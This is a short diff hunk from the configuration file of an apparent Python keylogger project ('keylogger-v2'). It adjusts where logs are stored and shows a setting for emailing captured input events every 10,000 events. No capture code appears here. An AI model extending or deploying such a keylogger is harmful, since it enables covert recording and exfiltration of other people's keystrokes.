@@ -6,7 +6,8 @@ LOGS_DIRECTORY = "/Users/mohamedkhettab/Desktop/Coding/Python/keylogger-v2/src"
 
 if not LOGS_DIRECTORY:
     LOGS_DIRECTORY = os.path.join(tempfile.gettempdir(), "logs")
-
+else:
+    LOGS_DIRECTORY = os.path.join(LOGS_DIRECTORY, "logs")
 # Input Configuration
 LOGS_PER_EMAIL = 10000  # Number of logged events before sending an email
 
